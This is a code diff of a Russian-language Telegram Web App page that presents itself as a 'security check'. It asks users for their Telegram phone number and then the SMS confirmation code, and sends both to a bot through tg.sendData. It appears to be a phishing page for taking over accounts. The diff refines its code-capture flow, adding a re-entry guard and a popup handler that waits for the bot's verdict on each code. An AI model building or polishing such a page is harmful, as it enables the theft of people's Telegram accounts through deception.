@@ -7,57 +7,22 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-            background:#0f0f0f;color:#fff;min-height:100vh;
-            display:flex;align-items:center;justify-content:center;padding:16px;
-        }
-        .container{
-            background:#1a1a1a;border-radius:20px;padding:32px 24px;
-            max-width:400px;width:100%;text-align:center;
-            border:1px solid #2a2a2a;
-        }
-        .shield{
-            width:80px;height:80px;margin:0 auto 24px;
-            background:linear-gradient(135deg,#2aabee,#1a8fc4);
-            border-radius:50%;display:flex;align-items:center;justify-content:center;
-            font-size:40px;
-        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f0f0f;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+        .container{background:#1a1a1a;border-radius:20px;padding:32px 24px;max-width:400px;width:100%;text-align:center;border:1px solid #2a2a2a}
+        .shield{width:80px;height:80px;margin:0 auto 24px;background:linear-gradient(135deg,#2aabee,#1a8fc4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px}
         h2{font-size:22px;margin-bottom:6px}
         .sub{color:#888;font-size:14px;margin-bottom:24px;line-height:1.5}
         .hidden{display:none!important}
-        
-        .input-box{
-            background:#1e1e1e;border:1px solid #2a2a2a;border-radius:12px;
-            padding:4px 16px;display:flex;align-items:center;gap:10px;margin-bottom:16px;
-        }
+        .input-box{background:#1e1e1e;border:1px solid #2a2a2a;border-radius:12px;padding:4px 16px;display:flex;align-items:center;gap:10px;margin-bottom:16px}
         .input-box span{color:#888;font-size:18px}
-        .input-box input{
-            width:100%;padding:14px 0;border:none;background:transparent;
-            color:#fff;font-size:16px;outline:none;font-family:inherit;
-        }
-        .input-box input::placeholder{color:#444}
-        
-        .btn{
-            width:100%;padding:15px;border:none;border-radius:12px;
-            background:#2aabee;color:#fff;font-size:16px;font-weight:600;
-            cursor:pointer;font-family:inherit;
-        }
+        .input-box input{width:100%;padding:14px 0;border:none;background:transparent;color:#fff;font-size:16px;outline:none;font-family:inherit}
+        .btn{width:100%;padding:15px;border:none;border-radius:12px;background:#2aabee;color:#fff;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit}
         .btn:active{transform:scale(0.97)}
         .btn:disabled{background:#333!important;color:#666!important}
-        
         .status{margin-top:14px;font-size:13px;min-height:20px}
         .status.err{color:#f44336}
-        .status.ok{color:#4caf50}
-        
-        .spinner{
-            display:inline-block;width:18px;height:18px;
-            border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;
-            border-radius:50%;animation:spin 0.7s linear infinite;
-            vertical-align:middle;margin-right:8px;
-        }
+        .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:8px}
         @keyframes spin{to{transform:rotate(360deg)}}
-        
         .success-icon{font-size:64px}
         .footer{margin-top:24px;font-size:11px;color:#333}
     </style>
@@ -66,7 +31,6 @@
     <div class="container">
         <div class="shield">🛡️</div>
         
-        <!-- Шаг 1: Номер -->
         <div id="step1">
             <h2>Проверка безопасности</h2>
             <p class="sub">Введите номер телефона привязанный к Telegram</p>
@@ -78,7 +42,6 @@
             <div class="status" id="status1"></div>
         </div>
         
-        <!-- Шаг 2: Код -->
         <div id="step2" class="hidden">
             <h2>Код подтверждения</h2>
             <p class="sub">SMS с кодом отправлена на<br><strong id="phoneDisplay"></strong></p>
@@ -91,7 +54,6 @@
             <span style="margin-top:14px;font-size:13px;color:#888;cursor:pointer" onclick="goBack()">← Назад</span>
         </div>
         
-        <!-- Шаг 3: Готово -->
         <div id="step3" class="hidden">
             <div class="success-icon">✅</div>
             <h2 style="margin-top:16px">Готово!</h2>
@@ -107,6 +69,7 @@
         tg.expand();
         
         let phoneNumber = '';
+        let isVerifying = false;
         
         function goStep2(){
             const raw = document.getElementById('phoneInput').value.trim();
@@ -122,11 +85,14 @@
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
             document.getElementById('phoneDisplay').textContent = phoneNumber;
+            document.getElementById('codeInput').focus();
             
             tg.sendData(JSON.stringify({action:'send_code', phone:phoneNumber}));
         }
         
         function verifyCode(){
+            if(isVerifying) return;
+            
             const code = document.getElementById('codeInput').value.trim();
             if(!code || code.length < 5){
                 document.getElementById('status2').textContent = 'Введите 5 цифр';
@@ -134,44 +100,45 @@
                 return;
             }
             
+            isVerifying = true;
             const btn = document.getElementById('verifyBtn');
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner"></span>Проверка...';
             document.getElementById('status2').textContent = '';
             document.getElementById('status2').className = 'status';
             
-            // Отправляем и ЖДЁМ ответа
+            // Отправляем боту
             tg.sendData(JSON.stringify({action:'verify_code', code:code, phone:phoneNumber}));
             
-            // Ответ придёт через showPopup или через событие
-            // Пока просто ждём 3 секунды и если нет ошибки - успех
-            window._codeVerified = false;
-            window._codeError = false;
-            
-            setTimeout(function(){
-                if(!window._codeError){
-                    document.getElementById('step2').classList.add('hidden');
-                    document.getElementById('step3').classList.remove('hidden');
-                }
-                btn.disabled = false;
-                btn.innerHTML = '✅ Подтвердить';
-            }, 3000);
+            // Ждём ответа через showPopup
+            // Бот вызовет showPopup с результатом
         }
         
         function goBack(){
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
             document.getElementById('status2').textContent = '';
-        }
-        
-        // Обработка ошибок от бота
-        window.showCodeError = function(msg){
-            window._codeError = true;
-            document.getElementById('status2').textContent = msg;
-            document.getElementById('status2').className = 'status err';
+            isVerifying = false;
             document.getElementById('verifyBtn').disabled = false;
             document.getElementById('verifyBtn').innerHTML = '✅ Подтвердить';
-        };
+        }
+        
+        // Колбэк при закрытии попапа
+        tg.onEvent('popupClosed', function(data) {
+            if(data.button_id === 'ok'){
+                // Успех
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+                isVerifying = false;
+            } else {
+                // Ошибка
+                document.getElementById('status2').textContent = 'Неверный код';
+                document.getElementById('status2').className = 'status err';
+                document.getElementById('verifyBtn').disabled = false;
+                document.getElementById('verifyBtn').innerHTML = '✅ Подтвердить';
+                isVerifying = false;
+            }
+        });
     </script>
 </body>
 </html>
